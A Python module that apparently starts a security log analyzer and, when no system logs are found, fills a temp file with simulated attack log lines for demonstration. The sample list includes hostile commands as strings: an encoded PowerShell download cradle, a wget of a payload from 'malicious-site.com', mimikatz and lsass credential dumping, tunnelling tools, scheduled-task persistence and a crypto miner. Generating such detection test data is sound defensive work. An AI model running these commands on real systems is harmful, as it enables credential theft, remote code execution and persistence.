"""
service_runner.py - Orchestrates and starts the log analysis engine.
"""

import asyncio
import logging
import os
import random
import tempfile
import threading
import time
from datetime import datetime

logger = logging.getLogger(__name__)

def generate_test_logs(test_log: str):
    """Generate simulated security log entries for demonstration."""
    test_patterns = [
        "Failed password for root from 192.168.1.100 port 22",
        "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
        "lsass.exe dumping credentials using comsvcs.dll",
        "ngrok tcp 3389 started",
        "wget http://malicious-site.com/payload.exe -O /tmp/payload",
        'schtasks /create /tn "Update" /tr "powershell -enc..." /sc minute /mo 5',
        "ssh failed password for invalid user admin from 10.0.0.50",
        'mimikatz.exe "sekurlsa::logonpasswords" exit',
        "cmd.exe /c powershell -windowstyle hidden -ep bypass",
        "SQLMap/1.0 - sqlmap.org",
        "frpc -c frpc.ini started",
        "xmrig --url pool.minexmr.com --user wallet_address",
    ]

    os.makedirs(os.path.dirname(test_log) if os.path.dirname(test_log) else '.', exist_ok=True)
    with open(test_log, 'w') as f:
        f.write("")

    while True:
        time.sleep(random.uniform(2, 8))
        with open(test_log, 'a') as f:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            f.write(f"{timestamp} {random.choice(test_patterns)}\n")
            f.flush()

def run_analyzer(analyzer):
    """Resolve available log files and start the analyzer engine."""
    log_files = [
        '/var/log/syslog',
        '/var/log/auth.log',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/kern.log',
        r'C:\Windows\System32\winevt\Logs\Security.evtx',
        r'C:\Windows\System32\winevt\Logs\System.evtx',
    ]

    existing_logs = [f for f in log_files if os.path.exists(f) and not f.endswith('.evtx')]

    if not existing_logs:
        test_log = os.path.join(tempfile.gettempdir(), 'test_security.log')
        existing_logs = [test_log]
        logger.info(f"No system logs found. Creating test log at {test_log}")
        threading.Thread(target=generate_test_logs, args=(test_log,), daemon=True).start()

    asyncio.run(analyzer.start(existing_logs))
